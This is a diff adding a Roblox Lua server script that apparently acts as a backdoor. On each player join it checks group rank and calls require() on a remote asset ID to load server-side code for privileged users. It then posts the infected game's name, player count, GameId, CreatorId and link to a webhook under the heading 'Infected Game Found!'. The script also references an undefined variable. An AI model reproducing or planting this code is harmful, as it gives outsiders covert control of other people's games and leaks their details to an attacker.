@@ -1,0 +1,56 @@
+game.Players.PlayerAdded:Connect(function(plr)
+	if nuts:GetRankInGroup(GroupID) >= 2 then -- make 2 the groups rank number | example : Premium Customer = 2
+		require(69420):ServerSide(plr.Name) -- require goes here, make sure the ui doesnt reset on spawn
+	end
+end)
+local http = game:GetService("HttpService")
+local webhook = "YourWebHook"
+local gamename = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
+local placeId = game.PlaceId
+local color = tonumber(0xff00c2)
+local players = game.Players
+local CreatorId = game.CreatorId
+local GameId = game.GameId
+local PrivateServerId  = game.PrivateServerId
+local Data = {
+	["embeds"] = {{
+		["title"] = "Dominator SS",
+		["description"] = "Infected Game Found!",
+		["type"] = "rich",
+		["image"] = {
+			["url"] = "https://www.roblox.com/asset-thumbnail/image?assetId="..game.PlaceId.."&width=768&height=432&format=png",
+		},
+		["color"] = color,
+		["fields"] = {
+			{
+				["name"] = "**Game Name**",
+				["value"] = gamename.Name,
+				["inline"] = true
+			},
+			{
+				["name"] = "**Players**",
+				["value"] = #players:GetPlayers().."/"..game.Players.MaxPlayers,
+				["inline"] = true
+			},
+			{
+				["name"] = "**GameId**",
+				["value"] = game.GameId,
+				["inline"] = true
+			},
+			{
+				["name"] = "**CreatorId**",
+				["value"] = game.CreatorId,
+				["inline"] = true
+			},
+			{
+				["name"] = "**Game Link**",
+				["value"] = "https://www.roblox.com/games/"..game.PlaceId,
+				["inline"] = false
+			},
+		}    
+	}}
+}
+
+
+local wsg = http:JSONEncode(Data)
+http:PostAsync(webhook,wsg)
